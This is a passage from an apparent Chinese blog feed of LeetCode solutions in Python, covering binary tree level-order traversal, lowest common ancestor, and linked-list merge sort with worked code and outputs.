class="keyword">not</span> root:</span><br><span class="line">            <span class="keyword">return</span> []</span><br><span class="line">        res = []</span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">dfs</span><span class="params">(index,r)</span>:</span></span><br><span class="line">            <span class="comment"># 假设res是[ [1],[2,3] ]， index是3，就再插入一个空list放到res中</span></span><br><span class="line">            <span class="keyword">if</span> len(res)&lt;index:</span><br><span class="line">                res.append([])</span><br><span class="line">            <span class="comment">#  将当前节点的值加入到res中，index代表当前层，假设index是3，节点值是99</span></span><br><span class="line">            <span class="comment"># res是[ [1],[2,3] [4] ]，加入后res就变为 [ [1],[2,3] [4,99] ]</span></span><br><span class="line">            res[index<span class="number">-1</span>].append(r.val)</span><br><span class="line">            <span class="comment"># 递归的处理左子树，右子树，同时将层数index+1</span></span><br><span class="line">            <span class="keyword">if</span> r.left:</span><br><span class="line">                dfs(index+<span class="number">1</span>,r.left)</span><br><span class="line">            <span class="keyword">if</span> r.right:</span><br><span class="line">                dfs(index+<span class="number">1</span>,r.right)</span><br><span class="line">        dfs(<span class="number">1</span>,root)</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">root = [<span class="number">3</span>,<span class="number">9</span>,<span class="number">20</span>,<span class="literal">None</span>,<span class="literal">None</span>,<span class="number">15</span>,<span class="number">7</span>]</span><br><span class="line">root_tree=create_tree(root)</span><br><span class="line">a=Solution()</span><br><span class="line">result =a.levelOrder(root_tree)</span><br><span class="line">result</span><br></pre></td></tr></table></figure><pre><code>[[3], [9, 20], [15, 7]]</code></pre>]]></content>
      
      
      <categories>
          
          <category> 数据结构与算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 数据结构与算法 </tag>
            
            <tag> 二叉树 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【数据结构与算法】【LeetCode】【二叉树】236.二叉树的最近公共祖先</title>
      <link href="2020/11/23/LeetCode-B-%E4%BA%8C%E5%8F%89%E6%A0%91-236.%20%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E6%9C%80%E8%BF%91%E5%85%AC%E5%85%B1%E7%A5%96%E5%85%88/"/>
      <url>2020/11/23/LeetCode-B-%E4%BA%8C%E5%8F%89%E6%A0%91-236.%20%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E6%9C%80%E8%BF%91%E5%85%AC%E5%85%B1%E7%A5%96%E5%85%88/</url>
      
        <content type="html"><![CDATA[<p>二叉树创建，最近公共祖先</p><a id="more"></a><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个二叉树, 找到该树中两个指定节点的最近公共祖先。</p><p>最近公共祖先的定义为：“对于有根树 T 的两个结点 p、q，最近公共祖先表示为一个结点 x，满足 x 是 p、q 的祖先且 x 的深度尽可能大（一个节点也可以是它自己的祖先）。”</p><p>例如，给定如下二叉树:  root = [3,5,1,6,2,0,8,null,null,7,4]</p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/201123binarytree.png" width="500px"><p>示例 1:</p><pre><code>输入: root = [3,5,1,6,2,0,8,null,null,7,4], p = 5, q = 1输出: 3解释: 节点 5 和节点 1 的最近公共祖先是节点 3。</code></pre><p>示例 2:</p><pre><code>输入: root = [3,5,1,6,2,0,8,null,null,7,4], p = 5, q = 4输出: 5解释: 节点 5 和节点 4 的最近公共祖先是节点 5。因为根据定义最近公共祖先节点可以为节点本身。</code></pre><p>说明:</p><pre><code>所有节点的值都是唯一的。p、q 为不同节点且均存在于给定的二叉树中。</code></pre><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><ul><li><p>最近公共祖先的定义： </p><pre><code>设节点 root为节点 p, q的某公共祖先，若其左子节点 root.left 和右子节点 root.right都不是 p,q的公共祖先，则称 root 是 “最近的公共祖先” 。</code></pre></li></ul><ul><li>根据以上定义，若 rootroot 是 p, qp,q 的 最近公共祖先 ，则只可能为以下情况之一：<ol><li>p 和 q 在 root 的子树中，且分列root 的 异侧（即分别在左、右子树中）；</li><li>p = root ，且q 在 root 的左或右子树中；</li><li>q = root ，且 p 在 root的左或右子树中；</li></ol></li></ul><img  src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/201123binarytree01.png" width="500px"><p>考虑通过递归对二叉树进行后序遍历，当遇到节点 p 或 q 时返回。从底至顶回溯，当节点 p, q在节点 root的异侧时，节点root 即为最近公共祖先，则向上返回 root 。</p><ul><li>递归解析：<ol><li>终止条件：<ul><li>当越过叶节点，则直接返回 null ；</li><li>当 root 等于 p,q，则直接返回 root；</li></ul></li><li>递推工作：<ul><li>开启递归左子节点，返回值记为 left ；</li><li>开启递归右子节点，返回值记为 right ；</li></ul></li><li>返回值： 根据 left和 right ，可展开为四种情况；<ul><li>1.当 left 和 right 同时为空 ：说明root 的左 / 右子树中都不包含 p,q ，返回null ；</li><li>2.当 left和 right 同时不为空 ：说明 p, q分列在 root 的 异侧 （分别在 左 / 右子树），因此 root 为最近公共祖先，返回 root ；</li><li>3.当 left 为空 ，right 不为空 ：p,q 都不在 root 的左子树中，直接返回 right 。具体可分为两种情况：<ul><li>p,q 其中一个在root 的 右子树 中，此时right 指向 p（假设为p ）；</li><li>p,q 两节点都在 root 的 右子树 中，此时的right 指向 最近公共祖先节点 ；</li></ul></li><li>4.当 left 不为空 ，right 为空 ：与情况 3. 同理；<blockquote><p>观察发现， 情况 1. 可合并至 3. 和 4. 内，详见文章末尾代码。</p></blockquote></li></ul></li></ol></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Definition for a binary tree node.</span></span><br><span class="line"><span class="keyword">from</span> queue <span class="keyword">import</span> Queue</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TreeNode</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, x)</span>:</span></span><br><span class="line">        self.val = x</span><br><span class="line">        self.left = <span class="literal">None</span></span><br><span class="line">        self.right = <span class="literal">None</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_tree</span><span class="params">(list_tree,p,q)</span>:</span></span><br><span class="line">    <span class="keyword">if</span>  <span class="keyword">not</span> list_tree:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    new_queue= Queue()</span><br><span class="line">    root = TreeNode(list_tree[<span class="number">0</span>])</span><br><span class="line">    new_queue.put(root) <span class="comment"># 先入队一个结点</span></span><br><span class="line">    count = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> new_queue.empty() <span class="keyword">and</span> count&lt;len(list_tree):</span><br><span class="line">        dequeue = new_queue.get() <span class="comment"># 出队</span></span><br><span class="line">        <span class="comment"># 返回p,q指向结点</span></span><br><span class="line">        <span class="keyword">if</span> p==dequeue.val:</span><br><span class="line">            p=dequeue</span><br><span class="line">        <span class="keyword">if</span> q==dequeue.val:</span><br><span class="line">            q=dequeue</span><br><span class="line">            </span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> dequeue.left <span class="keyword">and</span>  <span class="keyword">not</span> dequeue.right:</span><br><span class="line">            <span class="keyword">if</span> count&lt;len(list_tree) <span class="keyword">and</span> list_tree[count]:</span><br><span class="line">                dequeue.left=TreeNode(list_tree[count])</span><br><span class="line">            count= count+<span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> count&lt;len(list_tree) <span class="keyword">and</span> list_tree[count]:</span><br><span class="line">                dequeue.right=TreeNode(list_tree[count])</span><br><span class="line">            count= count+<span class="number">1</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> dequeue.left:</span><br><span class="line">                new_queue.put(dequeue.left)</span><br><span class="line">            <span class="keyword">if</span> dequeue.right:</span><br><span class="line">                new_queue.put(dequeue.right)</span><br><span class="line">    <span class="comment">#print(p.val,q.val)</span></span><br><span class="line">    <span class="keyword">return</span> root,p,q</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">lowestCommonAncestor</span><span class="params">(self, root: <span class="string">'TreeNode'</span>, p: <span class="string">'TreeNode'</span>, q: <span class="string">'TreeNode'</span>)</span> -&gt; 'TreeNode':</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> root <span class="keyword">or</span> root == p <span class="keyword">or</span> root == q: <span class="keyword">return</span> root</span><br><span class="line">        left = self.lowestCommonAncestor(root.left, p, q)</span><br><span class="line">        right = self.lowestCommonAncestor(root.right, p, q)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> left: <span class="keyword">return</span> right</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> right: <span class="keyword">return</span> left</span><br><span class="line">        <span class="keyword">return</span> root</span><br><span class="line"></span><br><span class="line">root = [<span class="number">3</span>,<span class="number">5</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">8</span>,<span class="literal">None</span>,<span class="literal">None</span>,<span class="number">7</span>,<span class="number">4</span>]</span><br><span class="line">p=<span class="number">5</span></span><br><span class="line">q=<span class="number">1</span></span><br><span class="line">root_tree,p,q=create_tree(root,p,q)</span><br><span class="line">a=Solution()</span><br><span class="line">result =a.lowestCommonAncestor(root_tree,p,q)</span><br><span class="line">result.val</span><br></pre></td></tr></table></figure><pre><code>3</code></pre><p>时间复杂度 O(N) ： 其中 N 为二叉树节点数；最差情况下，需要递归遍历树的所有节点。</p><p>空间复杂度 O(N) ： 最差情况下，递归深度达到 N ，系统使用 O(N) 大小的额外空间。</p>]]></content>
      
      
      <categories>
          
          <category> 数据结构与算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 数据结构与算法 </tag>
            
            <tag> 二叉树 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【数据结构与算法】【LeetCode】【链表】148.排序链表</title>
      <link href="2020/11/22/LeetCode-A-%E9%93%BE%E8%A1%A8-148.%20%E6%8E%92%E5%BA%8F%E9%93%BE%E8%A1%A8/"/>
      <url>2020/11/22/LeetCode-A-%E9%93%BE%E8%A1%A8-148.%20%E6%8E%92%E5%BA%8F%E9%93%BE%E8%A1%A8/</url>
      
        <content type="html"><![CDATA[<p>链表中点查找、链表排序、归并排序、分治与递归、递归、非递归。</p><a id="more"></a><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给你链表的头结点 head ，请将其按 升序 排列并返回 排序后的链表 。</p><p>进阶：</p><p>你可以在 O(n log n) 时间复杂度和常数级空间复杂度下，对链表进行排序吗？</p><p>示例1</p><pre><code>输入：head = [4,2,1,3]输出：[1,2,3,4]</code></pre><p>示例2</p><pre><code>输入：head = [-1,5,3,4,0]输出：[-1,0,3,4,5]</code></pre><p>示例3</p><pre><code>输入：head = []输出：[]</code></pre><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><h3 id="方法一：字典"><a href="#方法一：字典" class="headerlink" title="方法一：字典"></a>方法一：字典</h3><ul><li>将结点地址和值存入字典，使用sorted函数按照值排序，重新构造成链表</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ListNode</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, val=<span class="number">0</span>, next=None)</span>:</span></span><br><span class="line">        self.val = val</span><br><span class="line">        self.next = next</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">createLink_rearinsert</span><span class="params">(lista)</span>:</span></span><br><span class="line">    head = ListNode(<span class="number">-1</span>)</span><br><span class="line">    rear = head</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> lista:</span><br><span class="line">        new_node=ListNode(i)</span><br><span class="line">        rear.next=new_node</span><br><span class="line">        rear=new_node</span><br><span class="line">    <span class="keyword">return</span> head.next</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">sortList</span><span class="params">(self, head: ListNode)</span> -&gt; ListNode:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> head:</span><br><span class="line">            <span class="keyword">return</span> head</span><br><span class="line">        dic=dict()</span><br><span class="line">        <span class="keyword">while</span> head:</span><br><span class="line">            dic[head]=head.val</span><br><span class="line">            head=head.next</span><br><span class="line">        <span class="comment">#print(dic)</span></span><br><span class="line">        new_dic=sorted(dic.items(),key=<span class="keyword">lambda</span> item:item[<span class="number">1</span>])</span><br><span class="line">        head= ListNode(<span class="number">-1</span>)</span><br><span class="line">        rear = head</span><br><span class="line">        <span class="keyword">for</span> d <span class="keyword">in</span> new_dic:</span><br><span class="line">            rear.next = d[<span class="number">0</span>]</span><br><span class="line">            rear = rear.next</span><br><span class="line">        rear.next=<span class="literal">None</span></span><br><span class="line">        <span class="keyword">return</span> head.next</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    head = [<span class="number">-1</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">0</span>]</span><br><span class="line">    new_a=createLink_rearinsert(head)</span><br><span class="line">    a1 = Solution()</span><br><span class="line">    p=a1.sortList(new_a)</span><br><span class="line">    list_head=[]</span><br><span class="line">    <span class="keyword">while</span> p!=<span class="literal">None</span>:</span><br><span class="line">        list_head.append(p.val)</span><br><span class="line">        p=p.next</span><br><span class="line">    print(list_head)</span><br></pre></td></tr></table></figure><pre><code>[-1, 0, 3, 4, 5]</code></pre><h3 id="题目进阶分析"><a href="#题目进阶分析" class="headerlink" title="题目进阶分析"></a>题目进阶分析</h3><p>这道题考虑时间复杂度更低的排序算法。题目的进阶问题要求达到O(nlogn) 的时间复杂度和 O(1) 的空间复杂度，时间复杂度是 O(nlogn) 的排序算法包括归并排序、堆排序和快速排序（快速排序的最差时间复杂度是 $O(n^2)$) 其中最适合链表的排序算法是<strong>归并排序</strong>。</p><p>归并排序基于分治算法。最容易想到的实现方式是<strong>自顶向下</strong>的递归实现，考虑到递归调用的栈空间，自顶向下归并排序的空间复杂度是O(logn)。如果要达到 O(1)的空间复杂度，则需要使用<strong>自底向上</strong>的实现方式。</p><h3 id="方法二：自顶向下归并排序"><a href="#方法二：自顶向下归并排序" class="headerlink" title="方法二：自顶向下归并排序"></a>方法二：自顶向下归并排序</h3><p>对链表自顶向下归并排序的过程如下。</p><ul><li><p>找到链表的中点，以中点为分界，将链表拆分成两个子链表。寻找链表的中点可以使用快慢指针的做法，快指针每次移动 2 步，慢指针每次移动 1 步，当快指针到达链表末尾时，慢指针指向的链表节点即为链表的中点。</p></li><li><p>对两个子链表分别排序。</p></li><li><p>将两个排序后的子链表合并，得到完整的排序后的链表。</p></li></ul><p>上述过程可以通过递归实现。递归的终止条件是链表的节点个数小于或等于 1，即当链表为空或者链表只包含 1 个节点时，不需要对链表进行拆分和排序。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">sortList</span><span class="params">(self, head: ListNode)</span> -&gt; ListNode:</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">sortFunc</span><span class="params">(head: ListNode, tail: ListNode)</span> -&gt; ListNode:</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> head:</span><br><span class="line">                <span class="keyword">return</span> head</span><br><span class="line">            <span class="keyword">if</span> head.next == tail:</span><br><span class="line">                head.next = <span class="literal">None</span></span><br><span class="line">                <span class="keyword">return</span> head</span><br><span class="line">            slow = fast = head</span><br><span class="line">            <span class="keyword">while</span> fast != tail:</span><br><span class="line">                slow = slow.next</span><br><span class="line">                fast = fast.next</span><br><span class="line">                <span class="keyword">if</span> fast != tail:</span><br><span class="line">                    fast = fast.next</span><br><span class="line">            mid = slow</span><br><span class="line">            <span class="keyword">return</span> merge(sortFunc(head, mid), sortFunc(mid, tail))</span><br><span class="line">            </span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">merge</span><span class="params">(head1: ListNode, head2: ListNode)</span> -&gt; ListNode:</span></span><br><span class="line">            dummyHead = ListNode(<span class="number">0</span>)</span><br><span class="line">            temp, temp1, temp2 = dummyHead, head1, head2</span><br><span class="line">            <span class="keyword">while</span> temp1 <span class="keyword">and</span> temp2:</span><br><span class="line">                <span class="keyword">if</span> temp1.val &lt;= temp2.val:</span><br><span class="line">                    temp.next = temp1</span><br><span class="line">                    temp1 = temp1.next</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    temp.next = temp2</span><br><span class="line">                    temp2 = temp2.next</span><br><span class="line">                temp = temp.next</span><br><span class="line">            <span class="keyword">if</span> temp1:</span><br><span class="line">                temp.next = temp1</span><br><span class="line">            <span class="keyword">elif</span> temp2:</span><br><span class="line">                temp.next = temp2</span><br><span class="line">            <span class="keyword">return</span> dummyHead.next</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> sortFunc(head, <span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    head = [<span class="number">-1</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">0</span>,<span class="number">2</span>]</span><br><span class="line">    new_a=createLink_rearinsert(head)</span><br><span class="line">    a1 = Solution()</span><br><span class="line">    p=a1.sortList(new_a)</span><br><span class="line">    list_head=[]</span><br><span class="line">    <span class="keyword">while</span> p!=<span class="literal">None</span>:</span><br><span class="line">        list_head.append(p.val)</span><br><span class="line">        p=p.next</span><br><span class="line">    print(list_head)</span><br></pre></td></tr></table></figure><pre><code>[-1, 0, 2, 3, 4, 5]</code></pre><h3 id="自顶至底归并2"><a href="#自顶至底归并2" class="headerlink" title="自顶至底归并2"></a>自顶至底归并2</h3><p>通过递归实现链表归并排序，有以下两个环节：</p><ul><li>分割 cut 环节： 找到当前链表中点，并从中点将链表断开（以便在下次递归 cut 时，链表片段拥有正确边界）；<ul><li>我们使用 fast,slow 快慢双指针法，奇数个节点找到中点，偶数个节点找到中心左边的节点。</li><li>找到中点 slow 后，执行 slow.next = None 将链表切断。</li><li>递归分割时，输入当前链表左端点 head 和中心节点 slow 的下一个节点 tmp(因为链表是从 slow 切断的)。</li><li>cut 递归终止条件： 当head.next == None时，说明只有一个节点了，直接返回此节点。</li></ul></li><li>合并 merge 环节： 将两个排序链表合并，转化为一个排序链表。<ul><li>双指针法合并，建立辅助ListNode h 作为头部。</li><li>设置两指针 left, right 分别指向两链表头部，比较两指针处节点值大小，由小到大加入合并链表头部，指针交替前进，直至添加完两个链表。</li><li>返回辅助ListNode h 作为头部的下个节点 h.next。</li><li>时间复杂度 O(l + r)，l, r 分别代表两个链表长度。</li></ul></li><li>当题目输入的 head == None 时，直接返回None。</li></ul><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/201122guibing01.png" width="600px"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">sortList</span><span class="params">(self, head: ListNode)</span> -&gt; ListNode:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> head <span class="keyword">or</span> <span class="keyword">not</span> head.next: <span class="keyword">return</span> head <span class="comment"># termination.</span></span><br><span class="line">        <span class="comment"># cut the LinkedList at the mid index.</span></span><br><span class="line">        slow, fast = head, head.next</span><br><span class="line">        <span class="keyword">while</span> fast <span class="keyword">and</span> fast.next:</span><br><span class="line">            fast, slow = fast.next.next, slow.next</span><br><span class="line">        mid, slow.next = slow.next, <span class="literal">None</span> <span class="comment"># save and cut.</span></span><br><span class="line">        <span class="comment"># recursive for cutting.</span></span><br><span class="line">        left, right = self.sortList(head), self.sortList(mid)</span><br><span class="line">        <span class="comment"># merge `left` and `right` linked list and return it.</span></span><br><span class="line">        h = res = ListNode(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">while</span> left <span class="keyword">and</span> right:</span><br><span class="line">            <span class="keyword">if</span> left.val &lt; right.val: h.next, left = left, left.next</span><br><span class="line">            <span class="keyword">else</span>: h.next, right = right, right.next</span><br><span class="line">            h = h.next</span><br><span class="line">        h.next = left <span class="keyword">if</span> left <span class="keyword">else</span> right</span><br><span class="line">        <span class="keyword">return</span> res.next</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    head = [<span class="number">-1</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">0</span>,<span class="number">6</span>,<span class="number">2</span>]</span><br><span class="line">    new_a=createLink_rearinsert(head)</span><br><span class="line">    a1 = Solution()</span><br><span class="line">    p=a1.sortList(new_a)</span><br><span class="line">    list_head=[]</span><br><span class="line">    <span class="keyword">while</span> p!=<span class="literal">None</span>:</span><br><span class="line">        list_head.append(p.val)</span><br><span class="line">        p=p.next</span><br><span class="line">    print(list_head)</span><br></pre></td></tr></table></figure><pre><code>[-1, 0, 2, 3, 4, 5, 6]</code></pre><h3 id="方法三：-自底至顶归并排序"><a href="#方法三：-自底至顶归并排序" class="headerlink" title="方法三： 自底至顶归并排序"></a>方法三： 自底至顶归并排序</h3><ul><li>对于非递归的归并排序，需要使用迭代的方式替换cut环节：<ul><li>我们知道，cut环节本质上是通过二分法得到链表最小节点单元，再通过多轮合并得到排序结果。</li><li>每一轮合并merge操作针对的单元都有固定长度intv，例如：<ul><li>第一轮合并时intv = 1，即将整个链表切分为多个长度为1的单元，并按顺序两两排序合并，合并完成的已排序单元长度为2。</li><li>第二轮合并时intv = 2，即将整个链表切分为多个长度为2的单元，并按顺序两两排序合并，合并完成已排序单元长度为4。</li><li>以此类推，直到单元长度intv &gt;= 链表长度，代表已经排序完成。</li></ul></li><li>根据以上推论，我们可以仅根据intv计算每个单元边界，并完成链表的每轮排序合并，例如:<ul><li>当intv = 1时，将链表第1和第2节点排序合并，第3和第4节点排序合并，……。</li><li>当intv = 2时，将链表第1-2和第3-4节点排序合并，第5-6和第7-8节点排序合并，……。</li><li>当intv = 4时，将链表第1-4和第5-8节点排序合并，第9-12和第13-16节点排序合并，……。</li></ul></li></ul></li><li>此方法时间复杂度O(nlogn)，空间复杂度O(1)。</li></ul><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/201122guibing02.png" width="600px"><ul><li>模拟上述的多轮排序合并：<ul><li>统计链表长度length，用于通过判断intv &lt; length判定是否完成排序；</li><li>额外声明一个节点res，作为头部后面接整个链表，用于：<ul><li>intv *= 2即切换到下一轮合并时，可通过res.next找到链表头部h；</li><li>执行排序合并时，需要一个辅助节点作为头部，而res则作为链表头部排序合并时的辅助头部pre；后面的合并排序可以将上次合并排序的尾部tail用做辅助节点。</li></ul></li><li>在每轮intv下的合并流程：<ul><li>根据intv找到合并单元1和单元2的头部h1, h2。由于链表长度可能不是2^n，需要考虑边界条件：<ul><li>在找h2过程中，如果链表剩余元素个数少于intv，则无需合并环节，直接break，执行下一轮合并；</li><li>若h2存在，但以h2为头部的剩余元素个数少于intv，也执行合并环节，h2单元的长度为c2 = intv - i。</li></ul></li><li>合并长度为c1, c2的h1, h2链表，其中：<ul><li>合并完后，需要修改新的合并单元的尾部pre指针指向下一个合并单元头部h。（在寻找h1, h2环节中，h指针已经被移动到下一个单元头部）</li><li>合并单元尾部同时也作为下次合并的辅助头部pre。</li></ul></li><li>当h == None，代表此轮intv合并完成，跳出。</li></ul></li><li>每轮合并完成后将单元长度×2，切换到下轮合并：intv *= 2。</li></ul></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">sortList</span><span class="params">(self, head: ListNode)</span> -&gt; ListNode:</span></span><br><span class="line">        h, length, intv = head, <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">        <span class="comment"># 统计链表长度</span></span><br><span class="line">        <span class="keyword">while</span> h: </span><br><span class="line">            h, length = h.next, length + <span class="number">1</span></span><br><span class="line">            </span><br><span class="line">        res = ListNode(<span class="number">0</span>)</span><br><span class="line">        res.next = head</span><br><span class="line">        <span class="comment"># merge the list in different intv.</span></span><br><span class="line">        <span class="keyword">while</span> intv &lt; length:</span><br><span class="line">            pre, h = res, res.next</span><br><span class="line">            <span class="keyword">while</span> h:</span><br><span class="line">                <span class="comment"># get the two merge head `h1`, `h2`</span></span><br><span class="line">                h1, i = h, intv</span><br><span class="line">                <span class="keyword">while</span> i <span class="keyword">and</span> h: h, i = 